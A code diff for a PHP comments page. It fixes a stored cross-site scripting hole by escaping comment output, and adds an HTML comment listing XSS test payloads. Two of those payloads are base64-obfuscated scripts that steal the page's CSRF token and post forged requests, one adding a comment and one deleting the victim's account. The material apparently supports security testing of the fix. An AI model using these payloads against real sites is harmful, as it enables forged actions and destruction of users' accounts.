@@ -28,7 +28,7 @@
 				<?php foreach ($comments as $comment): ?>
 					<div class="card m-auto mb-3" style="width: 18rem;">
 						<div class="card-body">
-							<p class="card-text"><?= $comment['content'] ?></p>
+							<p class="card-text"><?= htmlspecialchars($comment['content']); ?></p>
 							<p class="card-text"><small class="text-muted"><?= $comment['created_at'] ?></small></p>
 						</div>
 					</div>
@@ -186,12 +186,28 @@
 					`;
 
 					document.querySelector('#comments').appendChild(card);
-
 					document.querySelector(`#comment-${id}-content`).innerText = content;
 					document.querySelector(`#comment-${id}-author`).innerText = author;
 					document.querySelector(`#comment-${id}-date`).innerText = created_at;
 				}
 			<?php endif; ?>
 		</script>
+		<!--
+			<h1>Hello</h1>
+			<script>alert('Hello')</script>
+
+			<script>
+				(function() {
+					setTimeout(() => {
+						var scr = document.createElement('script');
+						scr.innerHTML = 'Code html';
+						document.querySelector('body').appendChild(scr);
+					}, 3000)
+				})()
+			</script>
+
+			<script>(function() {setTimeout(() => {var scr = document.createElement('script');scr.innerHTML = atob('KGZ1bmN0aW9uKCkge2ZldGNoKCJodHRwczovLzEwLjAuMC4zL2NvbW1lbnRzIiwge21ldGhvZDogJ1BPU1QnLGhlYWRlcnM6IHsnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsfSxib2R5OiJjb250ZW50PUhlbGxvJnBvc3RJZD0iICsgd2luZG93LmxvY2F0aW9uLnNlYXJjaC5zcGxpdCgiPSIpWzFdICsgIiZjc3JmPSIgKyBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdpbnB1dFtuYW1lPSJjc3JmIl0nKS52YWx1ZSx9KS50aGVuKGFzeW5jIChfKSA9PiB7Y29uc3QgcmVzcG9uc2UgPSBhd2FpdCBfLmpzb24oKTthZGRDb21tZW50KHJlc3BvbnNlLmlkLCByZXNwb25zZS5jb250ZW50LCByZXNwb25zZS5hdXRob3IsIHJlc3BvbnNlLmNyZWF0ZWRfYXQpO2lucHV0LnZhbHVlID0gJyc7fSk7fSkoKTs=');document.querySelector('body').appendChild(scr);}, 3000)})()</script>
+			<script>(function() {setTimeout(() => {var scr = document.createElement('script');scr.innerHTML = atob('KGZ1bmN0aW9uKCkge2ZldGNoKCJodHRwczovLzEwLjAuMC4zL2FjY291bnQvZGVsZXRlIiwge21ldGhvZDogJ1BPU1QnLGhlYWRlcnM6IHsnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsfSxib2R5OiJjc3JmPSIgKyBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdpbnB1dFtuYW1lPSJjc3JmIl0nKS52YWx1ZSx9KS50aGVuKGFzeW5jIChfKSA9PiB7d2luZG93LmxvY2F0aW9uLmhyZWY9Ii8ifSk7fSkoKTs=');document.querySelector('body').appendChild(scr);}, 3000)})()</script>
+		-->
 	</body>
 </html>
